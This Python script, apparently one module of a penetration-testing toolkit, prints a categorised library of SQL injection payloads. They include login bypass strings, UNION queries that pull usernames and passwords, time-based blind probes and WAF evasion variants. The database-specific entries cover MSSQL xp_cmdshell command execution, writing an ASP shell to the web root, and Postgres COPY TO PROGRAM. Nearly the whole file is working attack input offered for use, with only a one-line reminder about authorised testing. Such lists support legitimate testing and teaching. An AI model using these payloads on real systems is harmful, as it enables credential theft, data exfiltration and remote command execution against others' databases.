"""SQLi Payloads — Module 117. SQL injection payload generation by DB/technique."""
import sys

PAYLOADS = {
    "auth_bypass": [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR 1=1--",
        "admin'--",
        "admin' #",
        "' OR 'x'='x",
        "') OR ('1'='1",
        "\" OR \"1\"=\"1",
        "1' OR '1'='1' /*",
        "' OR 1=1 LIMIT 1--",
    ],
    "union_select": [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT username,password,3 FROM users--",
        "' UNION ALL SELECT NULL,table_name,NULL FROM information_schema.tables--",
        "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables--",
    ],
    "blind": [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",
        "' AND (SELECT COUNT(*) FROM users)>0--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    ],
    "mysql": [
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--",
        "' UNION SELECT 1,@@version,3--",
        "' UNION SELECT 1,schema_name,3 FROM information_schema.schemata--",
        "' INTO OUTFILE '/tmp/test.txt'--",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    ],
    "mssql": [
        "'; EXEC xp_cmdshell('whoami')--",
        "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp','SELECT * FROM...'--",
        "' UNION SELECT 1,@@version,3--",
        "'; SELECT name FROM sysobjects WHERE xtype='U'--",
        "'; WAITFOR DELAY '0:0:10'--",
    ],
    "postgres": [
        "'; SELECT version()--",
        "'; SELECT current_user--",
        "'; SELECT table_name FROM information_schema.tables--",
        "'; COPY (SELECT '') TO PROGRAM 'id'--",
        "' AND 1=CAST((SELECT version()) AS INT)--",
    ],
    "waf_bypass": [
        "/*!UNION*/ /*!SELECT*/ 1,2,3--",
        "' /*!50000OR*/ '1'='1",
        "%27+OR+%271%27%3D%271",
        "' OR 0x313d31--",
        "' OR char(49)=char(49)--",
        "';%00 SELECT 1,2,3--",
    ],
}

def main():
    print("[MODULE 117] SQLI PAYLOADS")
    print("[SOURCE]     Local payload library — no external calls")
    print()
    raw = (sys.argv[1].strip() if len(sys.argv) > 1 else "").strip().lower()

    cats = list(PAYLOADS.keys())
    if raw in cats:
        selected = {raw: PAYLOADS[raw]}
    elif raw == "all":
        selected = PAYLOADS
    elif raw in ("mysql", "mssql", "postgres", "postgresql"):
        key = "postgres" if raw in ("postgres","postgresql") else raw
        selected = {key: PAYLOADS.get(key, {})}
    else:
        selected = PAYLOADS

    total = 0
    for cat, payloads in selected.items():
        print(f"[CATEGORY]  {cat.upper()}")
        for i, p in enumerate(payloads, 1):
            print(f"  [{i:02d}] {p}")
        print()
        total += len(payloads)

    print(f"[TOTAL]  {total} payloads")
    print()
    print("[CATEGORIES]  auth_bypass | union_select | blind | mysql | mssql | postgres | waf_bypass | all")
    print("[USAGE]        sqli_payloads.py blind       — time-based blind payloads")
    print("[USAGE]        sqli_payloads.py waf_bypass  — WAF evasion variants")
    print()
    print("[REMINDER] Only test against systems you own or have written permission to test.")
    print("[DONE] SQLi payload generation complete.")

if __name__ == "__main__":
    main()
